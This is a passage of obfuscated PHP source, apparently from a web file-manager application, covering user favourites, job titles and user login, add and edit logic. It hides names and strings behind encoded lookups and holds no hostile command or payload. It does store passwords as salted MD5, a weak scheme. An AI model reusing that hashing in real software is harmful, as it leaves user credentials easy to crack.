$ŠÙï—âº = array_remove_value($ŠÙï—âº, $ˆ ¿Ó–ò[194]); if (count($ŠÙï—âº) == 0) { return; } foreach ($—ùÇ³İ as $­Àğ˜Úú) { if (isset($­Àğ˜Úú[$ˆ ¿Ó–ò[1869]])) { $ŠÙï—âº[] = $­Àğ˜Úú[$ˆ ¿Ó–ò[1869]][$ˆ ¿Ó–ò[1655]]; } } $€êº‚çü = Model($ˆ ¿Ó–ò[537])->userListInfo($ŠÙï—âº); foreach ($—ùÇ³İ as &$­Àğ˜Úú) { $­Àğ˜Úú[$ˆ ¿Ó–ò[593]] = $€êº‚çü[$­Àğ˜Úú[$ˆ ¿Ó–ò[1655]]]; if (isset($­Àğ˜Úú[$ˆ ¿Ó–ò[1869]])) { $­Àğ˜Úú[$ˆ ¿Ó–ò[1869]][$ˆ ¿Ó–ò[593]] = $€êº‚çü[$­Àğ˜Úú[$ˆ ¿Ó–ò[1869]][$ˆ ¿Ó–ò[1655]]]; } } unset($­Àğ˜Úú); } private function _listAppendMeta(&$£»‹››) { $Â…Óş¬Ñ =& $_SERVER[Ôó‡è­ƒ]; $Û“’‡Àç = array_unique(array_to_keyvalue($£»‹››, $Â…Óş¬Ñ[12], $Â…Óş¬Ñ[1859])); $Û“’‡Àç = array_remove_value($Û“’‡Àç, $Â…Óş¬Ñ[194]); if (!$Û“’‡Àç) { return; } foreach ($£»‹›› as $ç¼ı©®Ñ) { if (isset($ç¼ı©®Ñ[$Â…Óş¬Ñ[1869]])) { $Û“’‡Àç[] = $ç¼ı©®Ñ[$Â…Óş¬Ñ[1869]][$Â…Óş¬Ñ[1859]]; } } $µñğÛğ¶ = $this->metaList($Û“’‡Àç); if (!$µñğÛğ¶) { return !1; } foreach ($£»‹›› as &$ç¼ı©®Ñ) { $ç¼ı©®Ñ[$Â…Óş¬Ñ[461]] = $µñğÛğ¶[$ç¼ı©®Ñ[$Â…Óş¬Ñ[1859]]]; if (isset($ç¼ı©®Ñ[$Â…Óş¬Ñ[1869]])) { $ç¼ı©®Ñ[$Â…Óş¬Ñ[1869]][$Â…Óş¬Ñ[461]] = $µñğÛğ¶[$ç¼ı©®Ñ[$Â…Óş¬Ñ[1869]][$Â…Óş¬Ñ[1859]]]; } } unset($ç¼ı©®Ñ); } private function metaList($¼È·Ì¥) { $»ÄŸèú =& $_SERVER[Ôó‡è­ƒ]; if (!$¼È·Ì¥) { return array(); } $ìœ‰‡¼¸ = array($»ÄŸèú[1859] => array($»ÄŸèú[7], $¼È·Ì¥)); $ì·¶šÆ = Model($»ÄŸèú[1870])->where($ìœ‰‡¼¸)->select(); $ì·¶šÆ = array_to_keyvalue_group($ì·¶šÆ, $»ÄŸèú[1859]); foreach ($ì·¶šÆ as $ˆÄ´†Íæ => $º´ÜÓÓ¶) { $ÑÓ©Àİ÷ = array(); foreach ($º´ÜÓÓ¶ as $ÉŸ¶¼äî) { $ÑÓ©Àİ÷[$ÉŸ¶¼äî[$»ÄŸèú[95]]] = $ÉŸ¶¼äî[$»ÄŸèú[373]]; } $ì·¶šÆ[$ˆÄ´†Íæ] = $ÑÓ©Àİ÷; } return $ì·¶šÆ ? $ì·¶šÆ : array(); } } goto fš„‹Íôë‡; A¯Ô¥â’ø: class UserFavModel extends ModelBase { protected $tableName = "\x75\x73\x65\162\137\x66\141\x76"; protected function cacheFunctionAlias($„—ªë) { $›º¯·Îæ =& $_SERVER[Ôó‡è­ƒ]; return array($›º¯·Îæ[1933] => array(USER_ID, $›º¯·Îæ[2250])); } protected function listData() { $¯œ›Ëšâ =& $_SERVER[Ôó‡è­ƒ]; $ö½òª‹½ = array($¯œ›Ëšâ[1646] => USER_ID, $¯œ›Ëšâ[479] => 0); $×Å†±– = $¯œ›Ëšâ[2251]; $”¡ ÄãÇ = $this->field($×Å†±–)->where($ö½òª‹½)->order($¯œ›Ëšâ[2252])->select(); return $”¡ ÄãÇ ? $”¡ ÄãÇ : array(); } protected function resetCache() { } protected function listView() { $î¤ˆ±şü =& $_SERVER[Ôó‡è­ƒ]; $¬ÍŸ…€à = $this->listData(); $Ë¾ÚÀöõ = array_filter_by_field($¬ÍŸ…€à, $î¤ˆ±şü[33], $î¤ˆ±şü[413]); $ó€‡ñÄ‘ = array_to_keyvalue($Ë¾ÚÀöõ, $î¤ˆ±şü[12], $î¤ˆ±şü[78]); if (!$ó€‡ñÄ‘) { return $¬ÍŸ…€à; } $ö¥°©ĞÖ = 2000; $À³·ùï = array($î¤ˆ±şü[414] => array($î¤ˆ±şü[415], $ó€‡ñÄ‘)); $ƒªéËæ = Model($î¤ˆ±şü[823])->listSource($À³·ùï, $ö¥°©ĞÖ); $ƒªéËæ = array_merge($ƒªéËæ[$î¤ˆ±şü[76]], $ƒªéËæ[$î¤ˆ±şü[77]]); $ƒªéËæ = array_to_keyvalue($ƒªéËæ, $î¤ˆ±şü[399]); foreach ($¬ÍŸ…€à as $´áİ¦”Î => $ÁäÚÎşÖ) { $Ê€ò˜é× = $ƒªéËæ[$ÁäÚÎşÖ[$î¤ˆ±şü[78]]]; $Ê€ò˜é× = $Ê€ò˜é× ? $Ê€ò˜é× : array(); $¬ÍŸ…€à[$´áİ¦”Î] = array_merge($Ê€ò˜é×, $ÁäÚÎşÖ); } return $¬ÍŸ…€à; } protected function addFav($¥áåÁ«Ü, $ßô«àˆä = '', $­Áóü˜ = "\x73\x6f\x75\162\143\145") { $€‚Äºã“ =& $_SERVER[Ôó‡è­ƒ]; $û©‘½ş = array($€‚Äºã“[1646] => USER_ID, $€‚Äºã“[479] => 0, $€‚Äºã“[419] => $­Áóü˜, $€‚Äºã“[418] => $¥áåÁ«Ü); if ($this->where($û©‘½ş)->find()) { return !1; } $û©‘½ş = array($€‚Äºã“[1646] => USER_ID, $€‚Äºã“[479] => 0); $úÄ¸ôÌò = $this->where($û©‘½ş)->max($€‚Äºã“[1846]); if (!$úÄ¸ôÌò) { $úÄ¸ôÌò = 0; } if (!$ßô«àˆä && $­Áóü˜ == $€‚Äºã“[413]) { $â’‘®Ø = Model($€‚Äºã“[1325])->where(array($€‚Äºã“[414] => $¥áåÁ«Ü))->find(); if (!$â’‘®Ø) { return !1; } $ßô«àˆä = $â’‘®Ø[$€‚Äºã“[32]]; } $ßô«àˆä = $this->getAutoName($ßô«àˆä); $‰ ÷Ó–‰ = array($€‚Äºã“[1646] => USER_ID, $€‚Äºã“[479] => 0, $€‚Äºã“[417] => $ßô«àˆä, $€‚Äºã“[418] => $¥áåÁ«Ü, $€‚Äºã“[419] => $­Áóü˜, $€‚Äºã“[1827] => $úÄ¸ôÌò + 1); return $this->add($‰ ÷Ó–‰); } protected function remove($õˆ¾‰‹ƒ) { $ŸµâïñÍ =& $_SERVER[Ôó‡è­ƒ]; $’ÄùÌ™¸ = array($ŸµâïñÍ[1646] => USER_ID, $ŸµâïñÍ[416] => $õˆ¾‰‹ƒ); return $this->where($’ÄùÌ™¸)->delete(); } protected function removeByName($îÒ¡Ó¯) { $è¶à’ï³ =& $_SERVER[Ôó‡è­ƒ]; $ÉÙĞÇ = array($è¶à’ï³[1646] => USER_ID, $è¶à’ï³[417] => $îÒ¡Ó¯, $è¶à’ï³[479] => 0); return $this->where($ÉÙĞÇ)->delete(); } protected function rename($—‘ÎŸ™, $õÅŠ÷Ò×) { $¡ä…Ú½˜ =& $_SERVER[Ôó‡è­ƒ]; if ($—‘ÎŸ™ == $õÅŠ÷Ò×) { return !1; } $ŒŠ‰²Ñú = $this->getAutoName($õÅŠ÷Ò×); if ($õÅŠ÷Ò× != $ŒŠ‰²Ñú) { return !1; } $°æºåš˜ = array($¡ä…Ú½˜[1646] => USER_ID, $¡ä…Ú½˜[479] => 0, $¡ä…Ú½˜[32] => $—‘ÎŸ™); return $this->where($°æºåš˜)->save(array($¡ä…Ú½˜[32] => $õÅŠ÷Ò×)); } protected function resetSort($ ŠÔ½òÊ) { $ñç±åŞ· =& $_SERVER[Ôó‡è­ƒ]; $ ŠÔ½òÊ = is_array($ ŠÔ½òÊ) ? $ ŠÔ½òÊ : array(); $±Ú‚Ÿ± = array($ñç±åŞ·[1646] => USER_ID); for ($îœŠˆ¶ = 0; $îœŠˆ¶ < count($ ŠÔ½òÊ); $îœŠˆ¶++) { $±Ú‚Ÿ±[$ñç±åŞ·[416]] = $ ŠÔ½òÊ[$îœŠˆ¶]; $this->where($±Ú‚Ÿ±)->save(array($ñç±åŞ·[1827] => $îœŠˆ¶ + 1)); } return !0; } protected function moveTop($˜¦ÆÇ¿‚) { $æÔ²à¬§ =& $_SERVER[Ôó‡è­ƒ]; $ïÂ‰¶ßÅ = array($æÔ²à¬§[1646] => USER_ID, $æÔ²à¬§[479] => 0); $Éı¼šŞ = $this->where($ïÂ‰¶ßÅ)->where(array($æÔ²à¬§[32] => $˜¦ÆÇ¿‚))->find(); if (!$Éı¼šŞ) { return; } $¡ë°¶æß = $this->field($æÔ²à¬§[396])->where($ïÂ‰¶ßÅ)->order($æÔ²à¬§[2252])->select(); $¡ë°¶æß = array_to_keyvalue($¡ë°¶æß, $æÔ²à¬§[12], $æÔ²à¬§[396]); $ŠŒ·ëŒÑ = $¡ë°¶æß; $¡ë°¶æß = array_remove_value($¡ë°¶æß, $Éı¼šŞ[$æÔ²à¬§[396]]); array_unshift($¡ë°¶æß, $Éı¼šŞ[$æÔ²à¬§[396]]); return $this->resetSort($¡ë°¶æß); } protected function moveBottom($¤åÚê‚) { $ğí²¢üÚ =& $_SERVER[Ôó‡è­ƒ]; $Ú®‹¸¿… = array($ğí²¢üÚ[1646] => USER_ID, $ğí²¢üÚ[479] => 0); $ëÀüø¼— = $this->where($Ú®‹¸¿…)->max($ğí²¢üÚ[1846]); $õË±³Òò = array($ğí²¢üÚ[1846] => $ëÀüø¼— + 1); return $this->where($Ú®‹¸¿…)->where(array($ğí²¢üÚ[32] => $¤åÚê‚))->save($õË±³Òò); } private function getAutoName($å³úıà™) { $èšÖ¡å• =& $_SERVER[Ôó‡è­ƒ]; $´ƒ¢İƒ¥ = array($èšÖ¡å•[1646] => USER_ID, $èšÖ¡å•[479] => 0); $¿ÛšÔ‹§ = $this->field($èšÖ¡å•[32])->where($´ƒ¢İƒ¥)->select(); $¿ÛšÔ‹§ = array_to_keyvalue($¿ÛšÔ‹§, $èšÖ¡å•[12], $èšÖ¡å•[32]); if (!$¿ÛšÔ‹§ || !in_array($å³úıà™, $¿ÛšÔ‹§)) { return $å³úıà™; } for ($¶®¿é¶™ = 0; $¶®¿é¶™ < count($¿ÛšÔ‹§); $¶®¿é¶™++) { if (!in_array($å³úıà™ . "\50{$¶®¿é¶™}\x29", $¿ÛšÔ‹§)) { return $å³úıà™ . "\50{$¶®¿é¶™}\51"; } } return $å³úıà™ . "\50{$¶®¿é¶™}\x29"; } } class UserJobModel extends ModelBaseLight { public $optionType = "\123\171\x73\164\145\155\56\152\157\142\114\x69\x73\164"; public $field = array("\156\x61\x6d\x65", "\x64\x65\163\x63", "\x73\x6f\x72\x74"); const JOB_KEY = "\163\145\x6c\146\112\x6f\x62\114\151\163\x74"; public function listData($¸Ú°¤í = false, $¦Â²›Ã = "\163\x6f\x72\164", $ÈÏÍîúå = false) { return parent::listData($¸Ú°¤í, $¦Â²›Ã, $ÈÏÍîúå); } public function remove($Üø¶íäÆ) { return parent::remove($Üø¶íäÆ); } public function add($¬ÅõÑ…) { $€ÛÔİ² =& $_SERVER[Ôó‡è­ƒ]; if ($this->findByName($¬ÅõÑ…[$€ÛÔİ²[32]])) { return !1; } $¬ÅõÑ…[$€ÛÔİ²[1846]] = $this->getSort(); return parent::insert($¬ÅõÑ…); } private function getSort() { $çßéííƒ =& $_SERVER[Ôó‡è­ƒ]; $ø÷  ¥á = parent::listData(); $ÁˆäÉ¨ = array_to_keyvalue($ø÷  ¥á, $çßéííƒ[12], $çßéííƒ[1846]); return empty($ÁˆäÉ¨) ? 0 : max($ÁˆäÉ¨) + 1; } public function update($Û¾Ñ, $è€¤ÓØ) { $Â©÷ÏÊ¹ =& $_SERVER[Ôó‡è­ƒ]; $±‘¨µ = parent::listData($Û¾Ñ); $Ş¿òòğñ = $this->findByName($è€¤ÓØ[$Â©÷ÏÊ¹[32]]); if (!$±‘¨µ || $Ş¿òòğñ && $Ş¿òòğñ[$Â©÷ÏÊ¹[396]] != $±‘¨µ[$Â©÷ÏÊ¹[396]]) { return !1; } return parent::update($Û¾Ñ, $è€¤ÓØ); } public function setUserJob($£êºé„«, $œâÒŞ®Ü) { $ÏÎ÷Ìà =& $_SERVER[Ôó‡è­ƒ]; if (!is_array($œâÒŞ®Ü)) { $œâÒŞ®Ü = array($œâÒŞ®Ü); } $áé§Ê© = parent::listData(); $òÏ¼²ƒ = array_to_keyvalue($áé§Ê©, $ÏÎ÷Ìà[32]); $—Í„®‰ = $ÏÎ÷Ìà[377]; foreach ($œâÒŞ®Ü as $¸Ï“Ï»ù) { if ($òÏ¼²ƒ[$¸Ï“Ï»ù]) { $—Í„®‰ .= $òÏ¼²ƒ[$¸Ï“Ï»ù][$ÏÎ÷Ìà[396]] . $ÏÎ÷Ìà[50]; } else { $¤ò”óÖ = $this->add($¸Ï“Ï»ù); $—Í„®‰ .= $¤ò”óÖ . $ÏÎ÷Ìà[50]; } } $—Í„®‰ = rtrim($—Í„®‰, $ÏÎ÷Ìà[50]); Model($ÏÎ÷Ìà[537])->metaSet($£êºé„«, self::JOB_KEY, $—Í„®‰); } public function getUserJob($ìÈ¹ºèÃ) { $ğÀœ«ï— = Model($_SERVER[Ôó‡è­ƒ][537])->metaGet($ìÈ¹ºèÃ); return $this->getUserJobInfo($ğÀœ«ï—[self::JOB_KEY]); } public function getUserJobInfo($¶ü¸îˆ) { $±¬¦ëÍ‹ =& $_SERVER[Ôó‡è­ƒ]; $ÒëÈˆò = explode($±¬¦ëÍ‹[50], $¶ü¸îˆ); $€¬á›¼Û = parent::listData(); $€¬á›¼Û = array_remove_key($€¬á›¼Û, $±¬¦ëÍ‹[197]); $äì¼ß”å = array(); foreach ($ÒëÈˆò as $ï…ÁĞÅ) { if (isset($€¬á›¼Û[$ï…ÁĞÅ])) { $äì¼ß”å[] = $€¬á›¼Û[$ï…ÁĞÅ]; } } return $äì¼ß”å; } } class UserModel extends ModelBase { protected $tableName = "\x75\x73\x65\162"; protected $tableMeta = array("\x74\141\142\x6c\145\116\141\155\145" => "\x75\x73\x65\x72\137\155\145\x74\141", "\155\x65\164\x61\x46\x69\145\x6c\144" => "\165\163\145\162\111\104"); protected $simpleField = "\x75\163\x65\x72\x49\x44\54\156\151\x63\x6b\116\x61\155\145\x2c\x6e\141\x6d\x65\54\x61\x76\x61\x74\x61\162\54\163\145\x78\x2c\163\164\141\164\165\163"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($ÆŸÎ—ıÛ) { $‘š»ü³ =& $_SERVER[Ôó‡è­ƒ]; $»°—š¡¹ = $‘š»ü³[2253]; return array($‘š»ü³[1900] => array($ÆŸÎ—ıÛ[0], $»°—š¡¹), $‘š»ü³[1902] => array($ÆŸÎ—ıÛ[0], $»°—š¡¹), $‘š»ü³[2254] => array($ÆŸÎ—ıÛ[0], $»°—š¡¹)); } protected function getInfo($­ìğ€, $™ªØüÜë = false) { $­£¥ùñ = $this->getInfoSimple($­ìğ€); if (!is_array($­£¥ùñ)) { return array(); } if ($™ªØüÜë) { return $this->_getInfoApply($­£¥ùñ); } return $this->cacheFunctionGet($_SERVER[Ôó‡è­ƒ][1904], $­ìğ€); } protected function getInfoFull($Ñî¾ï­û, $Á¨È¡À‚ = false) { $€¢«¦Ş = $this->getInfoSimple($Ñî¾ï­û); if (!is_array($€¢«¦Ş)) { return array(); } if ($Á¨È¡À‚) { return $this->_getInfoApply($€¢«¦Ş, !0); } return $this->cacheFunctionGet($_SERVER[Ôó‡è­ƒ][2255], $Ñî¾ï­û); } private function _getInfoApply($Á“û·É, $ûÛ™‘¡ = false) { $ú¯ı·¾å =& $_SERVER[Ôó‡è­ƒ]; if (!$Á“û·É) { return $Á“û·É; } $¡¶ãİË = md5($ú¯ı·¾å[2256] . $Á“û·É[$ú¯ı·¾å[889]] . $ú¯ı·¾å[2257] . $Á“û·É[$ú¯ı·¾å[32]]); $Á“û·É = $this->_listDataApplyItem($Á“û·É); $Õœâ³ìÖ = Model($ú¯ı·¾å[1325])->metaGet($Á“û·É[$ú¯ı·¾å[87]][$ú¯ı·¾å[399]]); $Á“û·É[$ú¯ı·¾å[2258]] = $¡¶ãİË; $Á“û·É[$ú¯ı·¾å[87]][$ú¯ı·¾å[2088]] = isset($Õœâ³ìÖ[$ú¯ı·¾å[2089]]) ? $Õœâ³ìÖ[$ú¯ı·¾å[2089]] : null; if ($ûÛ™‘¡) { $Á“û·É[$ú¯ı·¾å[461]] = $this->metaGet($Á“û·É[$ú¯ı·¾å[1655]]); } return $Á“û·É; } protected function getInfoSimple($Äãçİ€›, $æùÉèô÷ = false) { $ßõßŒùñ =& $_SERVER[Ôó‡è­ƒ]; if (!$Äãçİ€›) { return array(); } if ($æùÉèô÷) { $™×°èÅà = $this->where(array($ßõßŒùñ[1655] => intval($Äãçİ€›)))->find(); if (!is_array($™×°èÅà)) { return array(); } $™×°èÅà[$ßõßŒùñ[535]] = Action($ßõßŒùñ[2259])->parseUrl($™×°èÅà[$ßõßŒùñ[535]]); return $™×°èÅà; } return $this->cacheFunctionGet($ßõßŒùñ[1905], $Äãçİ€›); } protected function getInfoSimpleOuter($òÇÖ—„Ì) { $ùï¼¸æ =& $_SERVER[Ôó‡è­ƒ]; if (!$òÇÖ—„Ì || $òÇÖ—„Ì == 0) { return array($ùï¼¸æ[1655] => $ùï¼¸æ[194], $ùï¼¸æ[32] => $ùï¼¸æ[163] . LNG($ùï¼¸æ[2260]) . $ùï¼¸æ[532], $ùï¼¸æ[535] => STATIC_PATH . $ùï¼¸æ[2261]); } $˜¯ÊµÂğ = $this->cacheFunctionGet($ùï¼¸æ[1905], $òÇÖ—„Ì); $“ã¿öÈ = array_field_key($˜¯ÊµÂğ, explode($ùï¼¸æ[50], $this->simpleField)); if (!$“ã¿öÈ) { return array($ùï¼¸æ[1655] => $ùï¼¸æ[1188], $ùï¼¸æ[32] => $ùï¼¸æ[163] . LNG($ùï¼¸æ[2262]) . $ùï¼¸æ[532], $ùï¼¸æ[535] => STATIC_PATH . $ùï¼¸æ[2263]); } $“ã¿öÈ[$ùï¼¸æ[535]] = Action($ùï¼¸æ[2259])->parseUrl($“ã¿öÈ[$ùï¼¸æ[535]]); return $“ã¿öÈ; } protected function groupUser($‚“ùÀãó) { } public static function errorLang($ß´ÊìÛÊ) { $Ğû”áú¡ =& $_SERVER[Ôó‡è­ƒ]; $‰óä¦ñŠ = array(self::ERROR_USER_NOT_EXISTS => $Ğû”áú¡[2264], self::ERROR_USER_PASSWORD_ERROR => $Ğû”áú¡[2265], self::ERROR_USER_EXIST_NAME => $Ğû”áú¡[2266], self::ERROR_USER_EXIST_PHONE => $Ğû”áú¡[2267], self::ERROR_USER_EXIST_EMAIL => $Ğû”áú¡[2268], self::ERROR_USER_LOGIN_LOCK => $Ğû”áú¡[2269], self::ERROR_IP_NOT_ALLOW => $Ğû”áú¡[2270], self::ERROR_USER_EXIST_NICKNAME => $Ğû”áú¡[2271]); return LNG($‰óä¦ñŠ[$ß´ÊìÛÊ]); } public function getInfoByMeta($îŒ¶ã±Ù, $ÜàÙ¸») { $‰œ€Õ†· =& $_SERVER[Ôó‡è­ƒ]; $¤ˆ¶É’· = Model($‰œ€Õ†·[2272])->where(array($‰œ€Õ†·[95] => $îŒ¶ã±Ù, $‰œ€Õ†·[373] => $ÜàÙ¸»))->find(); if ($¤ˆ¶É’·) { return $this->getInfo($¤ˆ¶É’·[$‰œ€Õ†·[1655]]); } return !1; } public function userLoginCheck($°ôí´Óê, $µ·øÂ–ˆ) { $î®„ê¦® =& $_SERVER[Ôó‡è­ƒ]; $€—Äñ¯ò = $this->userLoginFind($°ôí´Óê); if (!$€—Äñ¯ò) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($€—Äñ¯ò[$î®„ê¦®[1655]], $µ·øÂ–ˆ)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } return $this->getInfo($€—Äñ¯ò[$î®„ê¦®[1655]]); } public function userLoginFind($×¸”û¿Ş) { $Ã™˜®àĞ =& $_SERVER[Ôó‡è­ƒ]; $¥°‘äï« = array($Ã™˜®àĞ[32] => $×¸”û¿Ş, $Ã™˜®àĞ[534] => $×¸”û¿Ş, $Ã™˜®àĞ[304] => $×¸”û¿Ş, $Ã™˜®àĞ[2273] => $×¸”û¿Ş, $Ã™˜®àĞ[1000] => $Ã™˜®àĞ[1002]); if ($this->nickNameRpt()) { unset($¥°‘äï«[$Ã™˜®àĞ[534]]); } return $this->where($¥°‘äï«)->find(); } public function clearCache($µü¼¾È) { $´¿¨’é— =& $_SERVER[Ôó‡è­ƒ]; $this->cacheFunctionClear($´¿¨’é—[1904], $µü¼¾È); $this->cacheFunctionClear($´¿¨’é—[1905], $µü¼¾È); $this->cacheFunctionClear($´¿¨’é—[2255], $µü¼¾È); } public function userPasswordCheck($Å–®âİ, $Ùü’–üß) { $£›ïú›À =& $_SERVER[Ôó‡è­ƒ]; $¿­±Ñİ¨ = $this->where(array($£›ïú›À[1655] => intval($Å–®âİ)))->find(); $úá¾Ğ©ø = $this->metaGet($Å–®âİ); $‚¦—Ü’ú = isset($úá¾Ğ©ø[$£›ïú›À[2274]]) ? $úá¾Ğ©ø[$£›ïú›À[2274]] : $£›ïú›À[12]; if (md5($‚¦—Ü’ú . trim($Ùü’–üß)) !== $¿­±Ñİ¨[$£›ïú›À[889]]) { return !1; } return !0; } public function userAdd($èì¿ù¬¬) { $¯€ô©±ö =& $_SERVER[Ôó‡è­ƒ]; $ß™Õ¥ù· = array($¯€ô©±ö[417] => $èì¿ù¬¬[$¯€ô©±ö[32]], $¯€ô©±ö[2275] => $èì¿ù¬¬[$¯€ô©±ö[1535]], $¯€ô©±ö[2276] => isset($èì¿ù¬¬[$¯€ô©±ö[304]]) ? $èì¿ù¬¬[$¯€ô©±ö[304]] : $¯€ô©±ö[12], $¯€ô©±ö[2277] => isset($èì¿ù¬¬[$¯€ô©±ö[2273]]) ? $èì¿ù¬¬[$¯€ô©±ö[2273]] : $¯€ô©±ö[12], $¯€ô©±ö[2278] => isset($èì¿ù¬¬[$¯€ô©±ö[534]]) ? $èì¿ù¬¬[$¯€ô©±ö[534]] : $èì¿ù¬¬[$¯€ô©±ö[32]], $¯€ô©±ö[2279] => isset($èì¿ù¬¬[$¯€ô©±ö[535]]) ? $èì¿ù¬¬[$¯€ô©±ö[535]] : $¯€ô©±ö[12], $¯€ô©±ö[2280] => isset($èì¿ù¬¬[$¯€ô©±ö[2281]]) ? $èì¿ù¬¬[$¯€ô©±ö[2281]] : 1, $¯€ô©±ö[2282] => $èì¿ù¬¬[$¯€ô©±ö[889]], $¯€ô©±ö[1906] => isset($èì¿ù¬¬[$¯€ô©±ö[1810]]) ? $èì¿ù¬¬[$¯€ô©±ö[1810]] : 1024 * 1024 * 20, $¯€ô©±ö[1907] => 0, $¯€ô©±ö[2283] => 0, $¯€ô©±ö[1949] => isset($èì¿ù¬¬[$¯€ô©±ö[748]]) ? $èì¿ù¬¬[$¯€ô©±ö[748]] : 1); if (!empty($èì¿ù¬¬[$¯€ô©±ö[1655]])) { $ß™Õ¥ù·[$¯€ô©±ö[1655]] = $èì¿ù¬¬[$¯€ô©±ö[1655]]; } $Şéà’Ï  = $this->_checkExist($èì¿ù¬¬); if ($Şéà’Ï  !== !0) { return $Şéà’Ï ; } if (!empty($ß™Õ¥ù·[$¯€ô©±ö[535]]) && strlen($ß™Õ¥ù·[$¯€ô©±ö[535]]) > 255) { $ß™Õ¥ù·[$¯€ô©±ö[535]] = $¯€ô©±ö[12]; } $ıÖú½¢ß = $this->add($ß™Õ¥ù·); $¦¨»ˆí¿ = array($¯€ô©±ö[2282] => $ß™Õ¥ù·[$¯€ô©±ö[889]], $¯€ô©±ö[2278] => $ß™Õ¥ù·[$¯€ô©±ö[534]]); $this->userEdit($ıÖú½¢ß, $¦¨»ˆí¿); Model($¯€ô©±ö[1325])->userRootAdd($ıÖú½¢ß); return $ıÖú½¢ß; } protected function userEditTest($êÚÕÍ¤æ, $ºí²®º„) { return $this->call($_SERVER[Ôó‡è­ƒ][2284], $êÚÕÍ¤æ, $ºí²®º„); } protected function userEdit($Œ¤¸€Ğ, $¶©ô–ïı) { $ÁÖ›“©  =& $_SERVER[Ôó‡è­ƒ]; $ˆÌÕÆ·Ë = $this->getInfoSimple($Œ¤¸€Ğ); if (!$ˆÌÕÆ·Ë) { return !1; } $ğùé¡êõ = $this->_checkExist($¶©ô–ïı, $Œ¤¸€Ğ); if ($ğùé¡êõ !== !0) { return $ğùé¡êõ; } if (isset($¶©ô–ïı[$ÁÖ›“© [889]]) && trim($¶©ô–ïı[$ÁÖ›“© [889]]) != $ÁÖ›“© [12]) { $¬—ÛĞµ‚ = $this->metaGet($Œ¤¸€Ğ); if (empty($¬—ÛĞµ‚[$ÁÖ›“© [2274]])) { $¬—ÛĞµ‚[$ÁÖ›“© [2274]] = rand_string(10); Model($ÁÖ›“© [509])->metaSet($Œ¤¸€Ğ, $ÁÖ›“© [2274], $¬—ÛĞµ‚[$ÁÖ›“© [2274]]); } $¶©ô–ïı[$ÁÖ›“© [889]] = md5($¬—ÛĞµ‚[$ÁÖ›“© [2274]] . trim($¶©ô–ïı[$ÁÖ›“© [889]])); } else { unset($¶©ô–ïı[$ÁÖ›“© [889]]); } if (!empty($¶©ô–ïı[$ÁÖ›“© [535]]) && strlen($¶©ô–ïı[$ÁÖ›“© [535]]) > 255) { $¶©ô–ïı[$ÁÖ›“© [535]] = $ÁÖ›“© [12]; } $this->where(array($ÁÖ›“© [1646] => $Œ¤¸€Ğ))->save($¶©ô–ïı); if (isset($¶©ô–ïı[$ÁÖ›“© [534]])) { $this->setNamePinyin($Œ¤¸€Ğ, $¶©ô–ïı[$ÁÖ›“© [534]]); } $this->clearCache($Œ¤¸€Ğ); return !0; } public function setNamePinyin($Ò­£ğ¶¥, $ùªş·¶ = false) { $Æõñâ± =& $_SERVER[Ôó‡è­ƒ]; if (!$ùªş·¶) { $ÑŒº¤¹ = $this->getInfoSimple($Ò­£ğ¶¥); $ùªş·¶ = $ÑŒº¤¹[$Æõñâ±[534]] ? $ÑŒº¤¹[$Æõñâ±[534]] : $ÑŒº¤¹[$Æõñâ±[32]]; } $’¸øõËí = Model($Æõñâ±[537]); if (!Input::check($ùªş·¶, $Æõñâ±[586])) { return $’¸øõËí->metaSet($Ò­£ğ¶¥, array($Æõñâ±[460] => $Æõñâ±[12], $Æõñâ±[459] => $Æõñâ±[12])); } return $’¸øõËí->metaSet($Ò­£ğ¶¥, array($Æõñâ±[460] => str_replace($Æõñâ±[53], $Æõñâ±[12], Pinyin::get($ùªş·¶)), $Æõñâ±[459] => Pinyin::get($ùªş·¶, $Æõñâ±[587]))); } private function nickNameRpt() { $‘ø®î°³ =& $_SERVER[Ôó‡è­ƒ]; $íç³Áá = Model($‘ø®î°³[768])->get($‘ø®î°³[2285]); $ŠŸïµ–­ = $GLOBALS[$‘ø®î°³[6]][$‘ø®î°³[380]][$‘ø®î°³[2285]]; $ëÎ™Èş = !is_null($íç³Áá) ? $íç³Áá : $ŠŸïµ–­; return !!$ëÎ™Èş; } private function _checkExist($Öƒ–´À, $¹«ÍŠä = false) { $×£Ğ‹Û =& $_SERVER[Ôó‡è­ƒ]; $àÚñš = array($×£Ğ‹Û[32] => UserModel::ERROR_USER_EXIST_NAME, $×£Ğ‹Û[534] => UserModel::ERROR_USER_EXIST_NICKNAME, $×£Ğ‹Û[304] => UserModel::ERROR_USER_EXIST_EMAIL, $×£Ğ‹Û[2273] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($àÚñš[$×£Ğ‹Û[534]]); } $ï™¡œÄŒ = $¹«ÍŠä ? array($×£Ğ‹Û[1655] => array($×£Ğ‹Û[2286], $¹«ÍŠä)) : array(); foreach ($àÚñš as $£Ùšğóí => $©´Ñ³Ö) { $©Ò†é = array(); foreach ($àÚñš as $‚À¶öœ => $şñÈÏ¢) { if (isset($Öƒ–´À[$‚À¶öœ]) && $Öƒ–´À[$‚À¶öœ]) { $©Ò†é[] = $Öƒ–´À[$‚À¶öœ]; } } if (!$©Ò†é) { continue; } $¯Úİ†½Â = array_merge(array($£Ùšğóí => array($×£Ğ‹Û[7], $©Ò†é)), $ï™¡œÄŒ); $õëı¿ß‘ = $this->where($¯Úİ†½Â)->find(); if ($õëı¿ß‘) { return $©´Ñ³Ö; } } return !0; } public function userListInfo($Ù”ê£Ì´) { $Ç…ó­¡Ÿ =& $_SERVER[Ôó‡è­ƒ]; $ÏÊªÜëå = array(); $Ù”ê£Ì´ = is_array($Ù”ê£Ì´) ? array_unique($Ù”ê£Ì´) : array(); if (!$Ù”ê£Ì´) { return $ÏÊªÜëå; } if (count($Ù”ê£Ì´) < 20) { foreach ($Ù”ê£Ì´ as $ĞëóÚÖ) { $ÏÊªÜëå[$ĞëóÚÖ . $Ç…ó­¡Ÿ[12]] = $this->getInfoSimpleOuter($ĞëóÚÖ); } } else { $ö½ÜĞÓ© = array($Ç…ó­¡Ÿ[1646] => 